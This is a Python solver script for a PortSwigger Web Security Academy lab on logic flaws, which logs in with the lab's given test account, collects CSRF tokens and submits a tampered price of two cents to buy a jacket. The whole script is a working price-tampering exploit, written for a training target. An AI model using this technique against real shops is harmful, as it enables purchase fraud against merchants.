#!/usr/bin/env python


'''This lab doesn't adequately validate user input. You can exploit a logic flaw in its purchasing workflow to buy items for an unintended price. To solve the lab, buy a "Lightweight l33t leather jacket".

You can log in to your own account using the following credentials: wiener:peter

Lab link: https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-excessive-trust-in-client-side-controls
'''

import requests
from bs4 import BeautifulSoup


s = requests.session()
lab_id = '0a1400a30428c54083dacf790092009d' #change based on generated lab


def token_extract(resp): # function for parsing the csrf token when needed
    soup = BeautifulSoup(resp, 'lxml')
    return soup.find('input', {'name': 'csrf'})['value']


# First we need to login as wiener:peter as provided in the instructions
uri = f"https://{lab_id}.web-security-academy.net/login"
r = s.get(uri) 
token = token_extract(r.text) # login csrf token

# Submit this data in next the post request to login
data = { 'username' : "wiener",
        'password' : "peter",
        'csrf': token
}
r2 = s.post(uri, data=data)

# Now we post the jacket to our cart with the tampered price
uri = f"https://{lab_id}.web-security-academy.net/cart"
data = {"productId": "1", "redir": "PRODUCT", "quantity": "1", "price": "2"} #price will be 2 cents
r3 = s.post(uri, data=data)

# Complete the order to solve the lab
# We need the csrf token from the cart page
r4 = s.get(uri)
token = token_extract(r4.text) #cart csrf token

# Use the csrf token to checkout our jacket purchase
uri = f"https://{lab_id}.web-security-academy.net/cart/checkout"
data = { "csrf": token }
r5 = s.post(uri, data=data)
if 'solved' in r5.text:
    print('solved')
else:
    print('nope')




